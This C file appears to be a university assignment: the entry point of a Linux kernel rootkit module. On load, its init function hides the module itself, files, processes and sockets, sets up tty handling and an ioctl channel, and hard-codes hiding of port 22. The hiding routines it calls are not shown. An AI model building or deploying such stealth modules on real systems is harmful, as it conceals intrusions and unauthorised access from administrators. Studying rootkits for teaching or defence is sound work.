/*
 * assignment3.c
 *
 * This kernel module provied and ioctl chanel for other modules to hide their existence from htop or other
 * taskmanagers.
 *
 */
#include "hook.h"

MODULE_AUTHOR("David Mildenberger, Benjamin Zanger");
MODULE_LICENSE("GPL"); /* required because kallsyms_lookup_name is exported as EXPORT_SYMBOL_GPL */
MODULE_DESCRIPTION(".");

/*
 * This function is called when the module is loaded.
 */
static int __init initialization(void)
{
	initialize_hiding_module();
	
	initialize_hiding_files();
	
	initialize_ioctl_device();
	
	initialize_process_hiding();

	initialize_tty();
	
	initialize_socket_hiding();
	
	add_socket_to_hide(5, 22);
	return 0;
}


/*
 * This function is called when the module is unloaded.
 */
static void __exit exit_function(void)
{
	remove_socket_hiding();
	remove_tty();
	remove_ioctl_device();
	
	remove_process_hiding();
	
	remove_hiding_files();
	remove_hiding_module();
}

module_init(initialization);
module_exit(exit_function);
